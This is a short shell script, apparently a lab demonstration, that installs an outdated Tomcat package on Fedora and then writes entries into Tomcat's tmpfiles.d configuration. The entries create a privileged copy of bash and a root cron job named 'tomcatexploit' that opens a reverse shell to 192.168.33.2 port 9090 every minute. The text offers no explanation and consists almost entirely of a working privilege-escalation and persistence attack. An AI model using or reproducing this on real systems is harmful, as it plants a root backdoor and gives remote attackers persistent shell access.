sudo loadkeys us
cd /usr/share/
sudo wget "ftp://mirror.switch.ch/pool/4/mirror/fedora/linux/releases/25/Server/x86_64/os/Packages/t/tomcat-8.0.36-2.fc25.noarch.rpm"
sudo dnf install -y tomcat-8.0.36-2.fc25.noarch.rpm
sudo systemctl enable tomcat
sudo systemctl start tomcat
sudo dnf install -y tomcat-webapps.noarch
#sudo dnf install -y tomcat-servlet-3.1-api.noarch

cat<<_eof_>>/usr/lib/tmpfiles.d/tomcat.conf
C /usr/share/tomcat/rootsh 4770 root root - /usr/bin/bash
z /usr/share/tomcat/rootsh 4770 root root -
F /etc/cron.d/tomcatexploit 0644 root root - * * * * * root nohup bash -i >/dev/tcp/192.168.33.2/9090 0<&1 2>&1 & \n\n
_eof_

#sudo /sbin/shutdown -r now

